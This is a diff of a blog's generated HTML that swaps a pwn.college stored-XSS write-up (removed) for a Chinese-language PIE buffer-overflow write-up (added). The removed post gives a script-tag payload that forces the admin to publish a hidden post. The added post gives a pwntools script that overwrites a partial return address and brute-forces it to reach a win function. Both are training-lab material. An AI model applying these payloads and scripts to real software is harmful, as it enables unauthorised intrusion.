@@ -20,20 +20,22 @@
     var CONFIG = {"hostname":"0x4a-210.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="题目简介&#x2F;challenge目录下有两个程序，server脚本开启网络服务，该服务模拟一个论坛功能，存在登录、发布帖子以及存草稿等功能，victim脚本模拟受害者，会去访问论坛网页，如果XSS注入成功，就能得到flag">
+  <meta name="description" content="题目简介程序开启了PIE保护，因此程序每次加载的基地址都是不确定的；我们无法再得知后门函数或者shellcode的真实地址，需要通过爆破的方法拿到shell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS-5">
-<meta property="og:url" content="http://0x4a-210.github.io/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/index.html">
+<meta property="og:title" content="PIEs-hard">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/index.html">
 <meta property="og:site_name" content="0x4A">
-<meta property="og:description" content="题目简介&#x2F;challenge目录下有两个程序，server脚本开启网络服务，该服务模拟一个论坛功能，存在登录、发布帖子以及存草稿等功能，victim脚本模拟受害者，会去访问论坛网页，如果XSS注入成功，就能得到flag">
+<meta property="og:description" content="题目简介程序开启了PIE保护，因此程序每次加载的基地址都是不确定的；我们无法再得知后门函数或者shellcode的真实地址，需要通过爆破的方法拿到shell">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Web/XSS5-flag.png">
-<meta property="article:published_time" content="2025-07-15T01:05:21.000Z">
-<meta property="article:modified_time" content="2025-07-19T04:56:03.156Z">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/PIEs/checksec.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/PIEs/win_auth.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/PIEs/flag.png">
+<meta property="article:published_time" content="2025-07-19T06:46:54.000Z">
+<meta property="article:modified_time" content="2025-07-19T07:27:43.664Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Web/XSS5-flag.png">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/intro/Pwn/PIEs/checksec.png">
 
-<link rel="canonical" href="http://0x4a-210.github.io/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/">
+<link rel="canonical" href="http://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/">
 
 
 <script id="page-configurations">
@@ -46,7 +48,7 @@
   };
 </script>
 
-  <title>XSS-5 | 0x4A</title>
+  <title>PIEs-hard | 0x4A</title>
   
 
 
@@ -156,7 +158,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://0x4a-210.github.io/2025/07/15/pwn.college/Intro-to-Cybersecurity/Web/XSS-5/">
+    <link itemprop="mainEntityOfPage" href="http://0x4a-210.github.io/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/PIEs-hard/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -169,7 +171,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          XSS-5
+          PIEs-hard
         </h1>
 
         <div class="post-meta">
@@ -178,16 +180,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
+              
 
-              <time title="Created: 2025-07-15 09:05:21" itemprop="dateCreated datePublished" datetime="2025-07-15T09:05:21+08:00">2025-07-15</time>
+              <time title="Created: 2025-07-19 14:46:54 / Modified: 15:27:43" itemprop="dateCreated datePublished" datetime="2025-07-19T14:46:54+08:00">2025-07-19</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2025-07-19 12:56:03" itemprop="dateModified" datetime="2025-07-19T12:56:03+08:00">2025-07-19</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -221,16 +217,13 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>&#x2F;challenge目录下有两个程序，server脚本开启网络服务，该服务模拟一个论坛功能，存在登录、发布帖子以及存草稿等功能，victim脚本模拟受害者，会去访问论坛网页，如果XSS注入成功，就能得到flag</p>
+        <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>程序开启了PIE保护，因此程序每次加载的基地址都是不确定的；我们无法再得知后门函数或者shellcode的真实地址，需要通过爆破的方法拿到shell<br></p>
 <span id="more"></span>
-<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>先看server端源代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])</span><br><span class="line">db.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE posts AS SELECT ? AS content, &quot;admin&quot; AS author, FALSE AS published&quot;&quot;&quot;</span>, [flag])</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/publish&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_publish</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> flask.session:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Log in first!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># https://www.sqlite.org/lang_update.html</span></span><br><span class="line">    db.execute(<span class="string">&quot;UPDATE posts SET published = TRUE WHERE author = ?&quot;</span>, [flask.session.get(<span class="string">&quot;username&quot;</span>)])</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>通过分析上述代码块，发现admin用户名下的帖子正是需要的flag，但初始是草稿状态，只能显示开头12个字符，因此需要想办法让admin把自己的贴子发布出去<br><br>同时注意到如果对应的用户访问了&#x2F;publish路由，就会直接将自己名下的草稿全部发出去，没有二次校验，因此想办法让admin访问注入后的页面，正好观察victim代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">challenge_url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Visiting <span class="subst">&#123;challenge_url&#125;</span>&quot;</span>)</span><br><span class="line">browser.get(challenge_url)</span><br><span class="line"></span><br><span class="line">browser.find_element(By.NAME, <span class="string">&quot;username&quot;</span>).send_keys(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">browser.find_element(By.NAME, <span class="string">&quot;password&quot;</span>).send_keys(<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>).read().strip())</span><br><span class="line">browser.find_element(By.NAME, <span class="string">&quot;submit&quot;</span>).submit()</span><br></pre></td></tr></table></figure>
-<p>可以发现该脚本正是需要的模拟admin登录，因此可以尝试注入js脚本达到欺骗admin把帖子发出去的目的</p>
-<h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><p>由于guest用户的口令是已知的，可以先以guest身份登录，发布包含恶意Javascript代码的帖子，如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&quot;http://challenge.localhost/publish&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>之后再运行victim脚本，最后刷新网页，可以观察到flag泄露<br><img src="/../../../../../../../photos/pwn.college/intro/Web/XSS5-flag.png"></p>
+<p>通过这题记录一个小trick，有关PIE的基础理论在这里<a href="https://0x4a-210.github.io/2025/07/19/pwn.college/TogetherReview/Binary-Exp/#more">二进制利用知识整理</a></p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec看一下，发现除了cananry全部保护开启，直接断绝shellcode的念头<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/checksec.png"><br>先考虑有没有后门函数，将二进制文件拖入IDA，可以看到有一个win_auth函数，同时溢出点在challenge函数<br><br>这样的话漏洞点就清晰了，就是通过覆盖challenge函数的返回地址来跳转到win_auth即可<br></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先计算偏移，同样在IDA里看缓冲区相对于rbp的偏移然后+8即可，算出来是120<br><br>接下来通过objdump看到win函数相对于程序装载基地址的偏移&#x3D;0x1ab2<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/win_auth.png"><br>但是这里有一个问题，我们不能跳转到0x1ab2，因为win函数入口处存在对参数值的校验，只能跳转到校验逻辑的后面，比如0x1ace<br><br>最后，我们需要覆盖最后一个半字节，爆破剩下的15位十六进制数<br><br>一个小trick，个人习惯把偏移加上个1、2左右，从做的题目来看，这样可以更早撞上（maybe程序装载基地址倒数第4位是0的概率更小？不太确定……），但不管怎么说，碰撞16次以后就有很高的概率可以碰对了<br><br>最后的利用脚本如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86_64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line">returnAddr=<span class="number">0x2ace</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*offset+p16(returnAddr)</span><br><span class="line">    ioTube=process(<span class="string">&quot;/challenge/binary-exploitation-pie-overflow&quot;</span>)</span><br><span class="line">    ioTube.recvuntil(<span class="string">&quot;Send your payload (up to 4096 bytes)!\n&quot;</span>)</span><br><span class="line">    ioTube.send(payload)</span><br><span class="line">    response=ioTube.recv().decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">r&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;w&quot;</span>).write(response)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>脚本运行完毕后可以在当前目录的flag.txt中找到flag<br><br><img src="/../../../../../../../photos/pwn.college/intro/Pwn/PIEs/flag.png"></p>
 
     </div>
 
@@ -246,12 +239,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2025/07/14/pwn.college/Intro-to-Cybersecurity/Web/AuthByPass-2/" rel="prev" title="AuthByPass-2">
-      <i class="fa fa-chevron-left"></i> AuthByPass-2
+    <a href="/2025/07/19/pwn.college/TogetherReview/Binary-Exp/" rel="prev" title="Binary-Exp">
+      <i class="fa fa-chevron-left"></i> Binary-Exp
     </a></div>
       <div class="post-nav-item">
-    <a href="/2025/07/17/pwn.college/Intro-to-Cybersecurity/Web/XSS-7/" rel="next" title="XSS-7">
-      XSS-7 <i class="fa fa-chevron-right"></i>
+    <a href="/2025/07/19/pwn.college/Intro-to-Cybersecurity/Pwn/String-Lengths-hard/" rel="next" title="String-Lengths-hard">
+      String-Lengths-hard <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -311,7 +304,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">题目简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">利用方法</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">题目简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">漏洞点分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞点利用</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
